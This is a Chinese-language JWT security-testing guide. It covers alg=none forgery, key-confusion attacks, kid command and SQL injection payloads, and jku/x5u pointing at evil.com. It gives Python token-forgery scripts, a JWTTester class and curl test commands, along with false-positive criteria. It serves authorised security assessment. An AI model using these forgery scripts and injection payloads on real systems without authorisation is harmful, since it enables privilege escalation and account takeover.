# JWT 认证测试

## 1. 概述

JWT（JSON Web Token）认证测试主要检查 Token 的生成、验证和使用是否存在安全漏洞。

**危险等级**: 高

## 2. JWT 结构

```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwMDAwMDAwMDB9.fake_signature
|__________||__________________________________||_____________|
   Header           Payload                        Signature
```

### 2.1 Header 解析

```json
{"alg": "HS256", "typ": "JWT"}
```

### 2.2 Payload 解析

```json
{"sub": "admin", "role": "admin", "iat": 1600000000, "exp": 1600003600}
```

## 3. 测试方法

### 3.1 空 Token 测试

```bash
# 无 Token
GET /api/user/info
Headers: {}

# 空 Authorization
GET /api/user/info
Headers: {"Authorization": ""}

# 无效格式
GET /api/user/info
Headers: {"Authorization": "fake_token"}
```

### 3.2 算法篡改

```bash
# alg=none - 删除签名
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.

# alg=HS256 → HS384
# alg=HS256 → HS512
# alg=RSA → HMAC (key confusion)
```

### 3.3 密钥混淆攻击

```bash
# 使用公钥作为密钥（适用于 RS256 → HS256）
# 获取公钥
GET /api/publickey
# 然后使用公钥伪造 Token
```

### 3.4 kid 注入

```bash
# kid 参数命令注入
{"kid": "xxx|whoami"}
{"kid": "xxx\"; ls; echo \""}
{"kid": "xxx' AND SLEEP(3)--"}
```

### 3.5 jku/x5u 注入

```bash
# 控制密钥来源
{"jku": "http://evil.com/jwks.json"}
{"x5u": "http://evil.com/cert.pem"}
```

### 3.6 常用 JWT Header

| Header | 说明 |
|--------|------|
| Authorization | `Bearer <token>` |
| X-Token | 自定义 Token 头 |
| token | 参数名 token |
| Admin-Token | 管理员专用 |

## 4. JWT 伪造攻击示例

### 4.1 alg=none 攻击

```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin", "iat": 1600000000}

def b64url_encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data).encode()
    ).rstrip(b'=').decode()

header_enc = b64url_encode(header)
payload_enc = b64url_encode(payload)

fake_token = f"{header_enc}.{payload_enc}."
print(fake_token)
```

### 4.2 密钥混淆攻击

```python
# 获取公钥（通常用于验证 RS256）
public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----"

# 使用公钥作为密钥签发 HS256 Token
import jwt
token = jwt.encode(
    {"sub": "admin"},
    public_key,
    algorithm="HS256"
)
```

## 5. Token 安全检查

### 5.1 检查项

| 检查项 | 安全配置 |
|--------|----------|
| alg | 应为 RS256/ES256，不应为 none/HS256 |
| exp | 应存在且合理（不超过24小时） |
| iss | 应存在且可信 |
| aud | 应存在且为当前应用 |
| jti | 唯一标识，防重放 |

### 5.2 不安全的 JWT 配置

```json
{"alg": "none"}
{"alg": "HS256", "secret": "secret123"}
{"alg": "HS256", "key": "shared_secret"}
```

## 6. 重放攻击测试

```bash
# 1. 获取有效 Token
POST /api/login
{"username": "admin", "password": "xxx"}
# 返回: {"token": "eyJhbGc..."}

# 2. 重放 Token
GET /api/user/info
Headers: {"Authorization": "Bearer eyJhbGc..."}

# 3. 检查是否每次都生成新 Token
# 如果 Token 可重放且不变 → 存在重放风险
```

## 7. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 垂直越权 | 伪造 admin 角色 |
| 水平越权 | 篡改 userId |
| 账户接管 | 修改用户信息 |

## 8. 测试检查清单

```
□ 解析 Token 结构（Header, Payload, Signature）
□ 测试空 Token 访问
□ 测试 alg=none 绕过
□ 测试算法篡改（HS256 → HS384/512）
□ 测试密钥混淆攻击
□ 测试 kid 注入
□ 测试 jku/x5u 注入
□ 检查 Token 过期时间（exp）
□ 检查重放攻击
□ 评估伪造难度和影响
```

## 9. JWT 库指纹

| 库 | 错误信息特征 |
|----|--------------|
| pyjwt | "Signature verification failed" |
| node-jsonwebtoken | "invalid signature" |
| java-jwt | "Signature verification errors" |
| go-jwt | "signature is invalid" |

## 10. 误报判断标准

### 10.1 核心判断原则

```
【重要】JWT测试的误判率高，必须明确区分"正常响应"和"漏洞响应"

判断逻辑：
1. 先获取正常认证流程的响应
2. 对比伪造/篡改Token后的响应
3. 差异必须说明"成功伪造了有效Token"

【真实漏洞特征】
- alg:none成功 → 返回正常业务数据（不是错误）
- 密钥混淆成功 → 能用公钥签发有效Token
- 修改userId后 → 能访问他人的数据

【误报特征】
- 空Token返回401 → 这是正常的安全防护
- 过期Token返回过期错误 → 这是正常的过期机制
- 伪造Token返回"签名错误" → 这是正常的验证失败
```

### 10.2 curl + 对比验证流程

```bash
# 1. 【必须先执行】获取正常认证Token
curl -s -X POST http://api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"xxx"}' > jwt_baseline.json

# 查看返回的Token结构
cat jwt_baseline.json | jq .

# 2. 分析Token结构
echo "Header:"
echo "$TOKEN" | cut -d'.' -f1 | base64 -d | jq .

echo "Payload:"
echo "$TOKEN" | cut -d'.' -f2 | base64 -d | jq .

# 3. 测试空Token（正常应该被拒绝）
curl -s -H "Authorization: " http://api/user/info > jwt_empty_test.json

# 4. 测试伪造Token
# alg=none伪造
curl -s -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." \
     http://api/user/info > jwt_forged_test.json

# 5. 对比响应
diff jwt_baseline.json jwt_empty_test.json
diff jwt_baseline.json jwt_forged_test.json
```

### 10.3 JWT漏洞判断矩阵

| 测试场景 | 正常响应 | 漏洞响应 | 判断 |
|----------|----------|----------|------|
| 空Token | 401/403拒绝 | 200返回数据 | ⚠️ 漏洞 |
| alg:none | 签名错误 | 200返回数据 | ⚠️ 漏洞 |
| 过期Token | 过期错误 | 200返回数据 | ⚠️ 漏洞 |
| 篡改userId | 自己的数据 | 他人的数据 | ⚠️ 漏洞 |
| 正确Token | 200返回数据 | - | 正常 |
| 错误签名 | 签名错误 | - | 正常（验证有效） |

### 10.4 Python脚本（JWT深度测试）

```python
import requests
import json
import base64
import time

class JWTTester:
    def __init__(self, target):
        self.target = target
        self.valid_token = None
        self.baseline_response = None
        
    def login(self, username, password):
        """获取有效Token"""
        resp = requests.post(
            f"{self.target}/login",
            json={"username": username, "password": password}
        )
        if resp.status_code == 200:
            data = resp.json()
            self.valid_token = data.get('token')
            return self.valid_token
        return None
    
    def parse_jwt(self, token):
        """解析JWT结构"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None, None, None
            
            def b64url_decode(data):
                # 添加padding
                data += '=' * (4 - len(data) % 4)
                return base64.urlsafe_b64decode(data)
            
            header = json.loads(b64url_decode(parts[0]))
            payload = json.loads(b64url_decode(parts[1]))
            signature = parts[2]
            
            return header, payload, signature
        except Exception as e:
            return None, None, None
    
    def test_empty_token(self, endpoint):
        """测试空Token"""
        resp = requests.get(
            f"{self.target}/{endpoint}",
            headers={"Authorization": ""}
        )
        return resp
    
    def test_alg_none(self, endpoint, payload_modify=None):
        """测试alg:none漏洞"""
        # 构造alg:none的Token
        header = {"alg": "none", "typ": "JWT"}
        payload = {"sub": "admin", "iat": int(time.time())}
        
        if payload_modify:
            payload.update(payload_modify)
        
        def b64url_encode(data):
            return base64.urlsafe_b64encode(
                json.dumps(data).encode()
            ).rstrip(b'=').decode()
        
        header_enc = b64url_encode(header)
        payload_enc = b64url_encode(payload)
        fake_token = f"{header_enc}.{payload_enc}."
        
        resp = requests.get(
            f"{self.target}/{endpoint}",
            headers={"Authorization": f"Bearer {fake_token}"}
        )
        return resp, fake_token
    
    def test_signature_forgery(self, endpoint, public_key):
        """测试密钥混淆攻击"""
        try:
            import jwt
            
            # 使用公钥作为密钥签发HS256 Token
            payload = {"sub": "admin", "role": "admin"}
            forged = jwt.encode(payload, public_key, algorithm="HS256")
            
            resp = requests.get(
                f"{self.target}/{endpoint}",
                headers={"Authorization": f"Bearer {forged}"}
            )
            return resp, forged
        except:
            return None, None
    
    def assess_vulnerability(self, name, test_response, baseline_response):
        """
        评估是否为真实漏洞
        
        判断标准：
        1. 状态码是否为200
        2. 响应是否包含业务数据（不是错误消息）
        3. 响应与baseline是否有实质差异
        """
        if test_response is None:
            return False, "请求失败"
        
        # 获取测试响应内容
        test_data = test_response.text
        test_status = test_response.status_code
        
        # 获取baseline内容
        if baseline_response:
            baseline_data = baseline_response.text
        else:
            baseline_data = None
        
        # 判断漏洞
        # 1. 状态码200（不是401/403）
        # 2. 响应包含业务数据（不是错误消息）
        if test_status == 200:
            error_keywords = ['error', '失败', '错误', 'invalid', 'forbidden', 'unauthorized']
            is_error = any(kw in test_data.lower() for kw in error_keywords)
            
            if not is_error:
                return True, f"疑似漏洞：状态码{test_status}，响应非错误"
            else:
                return False, f"正常响应：包含错误提示"
        
        return False, f"正常拒绝：状态码{test_status}"
    
    def run_tests(self, username="admin", password="admin"):
        """执行完整JWT测试"""
        print(f"\n=== JWT安全测试 ===\n")
        
        # 1. 获取有效Token
        print("[1] 获取有效Token")
        token = self.login(username, password)
        if token:
            header, payload, sig = self.parse_jwt(token)
            print(f"  Token: {token[:50]}...")
            print(f"  Header: {json.dumps(header)}")
            print(f"  Payload: {json.dumps(payload)}")
            self.valid_token = token
        else:
            print("  获取Token失败")
            return
        
        # 获取baseline响应
        print("\n[2] 获取正常响应baseline")
        resp = requests.get(
            f"{self.target}/user/info",
            headers={"Authorization": f"Bearer {token}"}
        )
        self.baseline_response = resp
        print(f"  Status: {resp.status_code}")
        print(f"  Response: {resp.text[:200]}")
        
        # 测试空Token
        print("\n[3] 测试空Token")
        resp = self.test_empty_token("user/info")
        print(f"  Status: {resp.status_code}")
        is_vuln, reason = self.assess_vulnerability("空Token", resp, self.baseline_response)
        print(f"  {reason}")
        
        # 测试alg:none
        print("\n[4] 测试alg:none")
        resp, fake_token = self.test_alg_none("user/info")
        if resp:
            print(f"  伪造Token: {fake_token[:50]}...")
            is_vuln, reason = self.assess_vulnerability("alg:none", resp, self.baseline_response)
            print(f"  {reason}")
        
        return {
            'valid_token': token,
            'alg_none_vulnerable': is_vuln
        }

# 使用示例
if __name__ == "__main__":
    tester = JWTTester("http://api")
    results = tester.run_tests()
```

## 11. 实战判断案例

### 案例1：正常的Token验证

```
【场景】：空Token被正确拒绝

curl测试：
  curl -H "Authorization: " http://api/user/info
  → {"code":401,"msg":"请先登录"}

判断：
- 状态码401
- 响应包含"请先登录"
- 结论：【安全】Token验证正常工作
```

### 案例2：alg:none漏洞

```
【场景】：使用alg:none伪造Token成功访问

curl测试：
  # 构造alg:none Token
  curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." \
       http://api/user/info
  → {"userId":1,"username":"admin","role":"admin"}

判断：
- 伪造Token返回了正常的业务数据
- 没有被拒绝
- 结论：【确认漏洞】alg:none漏洞存在
```

### 案例3：密钥混淆攻击

```
【场景】：使用公钥伪造Token成功

前提：
1. 获取公钥: GET /api/publickey
2. 使用公钥作为HS256密钥签发Token

curl测试：
  curl -H "Authorization: Bearer <伪造的Token>" http://api/admin/users

判断：
- 如果返回200且包含用户数据 → 确认漏洞
- 如果返回403/签名错误 → 安全

结论：【确认漏洞/安全】取决于响应
```
